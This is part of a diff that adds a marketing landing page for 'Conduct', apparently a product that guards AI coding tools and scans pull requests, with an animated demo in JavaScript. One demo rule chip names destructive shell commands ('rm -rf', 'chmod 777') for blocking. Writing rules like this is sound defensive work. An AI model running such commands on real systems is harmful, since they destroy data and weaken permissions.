+          <path d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z"/>
+        </svg>
+        View on GitHub
+      </a>
+      <span style="color:var(--stone-200)">·</span>
+      <a class="gh-link" href="#">Read the docs</a>
+    </div>
+  </div>
+</section>
+
+<!-- ── FINAL CTA ── -->
+<section id="final-cta">
+  <div class="section-inner">
+    <div class="section-title">Be one of the first<br>engineering teams on Conduct.</div>
+    <div class="section-sub">No waitlist. No sales call required. Start with the free tier and expand as your team grows.</div>
+    <div class="final-btns">
+      <button class="btn-white">Start free</button>
+      <button class="btn-ghost">Book 15 min →</button>
+    </div>
+    <div class="early-note">Free tier includes Guard, 5 playbooks, and 1 security scan per day.</div>
+  </div>
+</section>
+
+<!-- ── FOOTER ── -->
+<footer>
+  <div class="footer-logo">Conduct</div>
+  <div class="footer-links">
+    <a href="#">Playbooks</a>
+    <a href="#">Docs</a>
+    <a href="#">GitHub</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
+</footer>
+
+<script>
+/* ── HERO ANIMATION (split-layout version) ── */
+const SCENARIOS = [
+  {
+    intent: "Stop AI tools from running destructive commands",
+    name: "Guard", q: "— what do you want to guard?",
+    iconCls: "icon-guard", icon: "🛡",
+    example: '"Stop AI tools from running destructive shell commands"',
+    chips: [
+      { label: "on tool-call: bash" },
+      { label: "matches rm -rf, chmod 777", cls: "danger" },
+      { label: "block & notify" },
+    ],
+    statPrefix: "Would have blocked ", statN: 4, statSuffix: " actions yesterday",
+  },
+  {
+    intent: "Catch secrets and SQL injection before they merge",
+    name: "Secure", q: "— how do you want to write secure code?",
+    iconCls: "icon-secure", icon: "🔒",
+    example: '"Catch SQL injection and hardcoded secrets before merge"',
+    chips: [
+      { label: "on PR opened" },
+      { label: "SQLi / secret findings", cls: "warn" },
+      { label: "comment & open fix PR" },
+    ],
+    statPrefix: "Would have flagged ", statN: 3, statSuffix: " of last 20 PRs",
+  },
+  {
+    intent: "Triage incoming GitHub issues automatically",
+    name: "Automate", q: "— what do you want to automate?",
+    iconCls: "icon-automate", icon: "⚡",
+    example: '"Triage incoming GitHub issues"',
+    chips: [
+      { label: "on issue opened" },
+      { label: "classify & label" },
+      { label: "assign & comment" },
+    ],
+    statPrefix: "Matches ", statN: 38, statSuffix: " issues from last week",
+  },
+]
+
+const wait = ms => new Promise(r => setTimeout(r, ms))
+
+const intentBox   = document.getElementById('intentBox')
+const intentInput = document.getElementById('intentInput')
+const ruleCard    = document.getElementById('ruleCard')
+const cardIcon    = document.getElementById('cardIcon')
+const cardName    = document.getElementById('cardName')
+const cardQ       = document.getElementById('cardQ')
+const cardExample = document.getElementById('cardExample')
+const cardChips   = document.getElementById('cardChips')
+const cardStat    = document.getElementById('cardStat')
+const confirmBtn  = document.getElementById('confirmBtn')
+const activeBadge = document.getElementById('activeBadge')
+
+function populateCard(s, instant) {
+  cardIcon.className = 'card-icon ' + s.iconCls
+  cardIcon.textContent = s.icon
+  cardName.textContent = s.name
+  cardQ.textContent    = s.q
+  cardExample.textContent = s.example
+  cardChips.innerHTML  = ''
+  s.chips.forEach(c => {
+    const el = document.createElement('span')
+    el.className = 'card-chip' + (c.cls ? ' ' + c.cls : '') + (instant ? ' show' : '')
+    el.textContent = c.label
+    cardChips.appendChild(el)
+  })
+  cardStat.textContent = s.statPrefix + s.statN + s.statSuffix
+  cardStat.className   = 'card-stat' + (instant ? ' show' : '')
+  confirmBtn.className = 'confirm-btn'
+  confirmBtn.textContent = 'Confirm'
+  confirmBtn.style.cssText = ''
+  activeBadge.className = 'active-badge'
+}
+
+async function typeIn(text) {
+  intentBox.classList.add('focused')
+  intentInput.value = ''
+  for (const ch of text) {
+    intentInput.value += ch
+    let d = 46 + Math.random() * 18
+    if (ch === ',') d = 110
+    if ('.!?'.includes(ch)) d = 175
+    await wait(d)
+  }
+}
+
+async function countUp(target, setter) {
+  const steps = 24, dur = 700
+  for (let i = 0; i <= steps; i++) {
+    setter(Math.round(target * i / steps))
+    await wait(dur / steps)
+  }
+}
+
+async function run(s) {
+  // Crossfade to new scenario
+  ruleCard.classList.add('dim')
+  await wait(240)
+  populateCard(s, false)
+  ruleCard.classList.remove('dim')
+  await wait(280)
+
+  // Type intent
+  await typeIn(s.intent)
+  await wait(280)
+
+  // Show chips
+  for (const chip of cardChips.querySelectorAll('.card-chip')) {
+    await wait(165)
+    chip.classList.add('show')
+  }
+  await wait(240)
+
+  // Count up stat
+  cardStat.classList.add('show')
+  await countUp(s.statN, v => { cardStat.textContent = s.statPrefix + v + s.statSuffix })
+  await wait(380)
+
+  // Confirm
+  confirmBtn.classList.add('show')
+  await wait(340)
+  confirmBtn.classList.add('pulse')
+  await wait(1200)
+  confirmBtn.classList.remove('pulse')
+  confirmBtn.classList.add('done')
+  confirmBtn.textContent = '✓'
+  ruleCard.classList.add('activated')
+  await wait(380)
+
+  confirmBtn.style.opacity  = '0'
+  confirmBtn.style.transform = 'scale(0.9)'
+  await wait(140)
+  confirmBtn.style.display = 'none'
+  activeBadge.classList.add('show')
+  await wait(2000)
+
+  // Reset
+  ruleCard.classList.remove('activated')
+  intentBox.classList.remove('focused')
+  intentInput.value = ''
+  await wait(400)
+}
+
+// Show first scenario immediately; loop starts on second
+populateCard(SCENARIOS[0], true)
+
+setTimeout(async () => {
+  let idx = 1
+  while (true) {
+    await run(SCENARIOS[idx])
+    idx = (idx + 1) % SCENARIOS.length
+  }
+}, 2000)
+
+/* ── COPY INSTALL ── */
+function copyInstall() {
+  navigator.clipboard.writeText('pip install conduct')
+  const btn = document.querySelector('.copy-btn')
+  btn.textContent = 'copied!'
+  setTimeout(() => { btn.textContent = 'copy' }, 2000)
+}
+</script>
+
+</body>
+</html>
